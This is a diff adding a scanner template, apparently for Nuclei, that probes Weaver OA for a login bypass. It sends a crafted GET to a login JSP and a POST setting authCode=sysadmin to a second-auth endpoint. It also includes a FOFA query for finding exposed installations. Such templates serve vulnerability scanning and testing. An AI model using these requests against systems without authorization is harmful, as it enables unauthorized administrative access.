@@ -1,0 +1,44 @@
+id: Weaver-OA-LoginBypass
+
+info:
+  name: Weaver OA LoginBypass
+  author: cr
+  severity: high
+  reference:
+    - https://github.com/coldrainh
+  tags: Weaver,oa,loginbypass
+
+requests:
+  - method: GET
+    path:
+      - '{{BaseURL}}/login/VerifyGDLogin.jsp?para1=1&para2=2'
+
+    matchers-condition: and
+    matchers:
+      - type: regex
+        regex:
+          - "/login/1"
+        part: body
+
+      - type: status
+        status:
+          - 302
+
+  - method: POST
+    path:
+      - '{{BaseURL}}/api/encrypt/secondauthsetting/saveCAAuth'
+
+    body: |
+        authCode=sysadmin
+
+    matchers-condition: and
+    matchers:
+      - type: regex
+        regex:
+          - '{"status":"1"}'
+        part: body
+
+      - type: status
+        status:
+          - 200
+#fofa-query:app="泛微-协同办公OA"
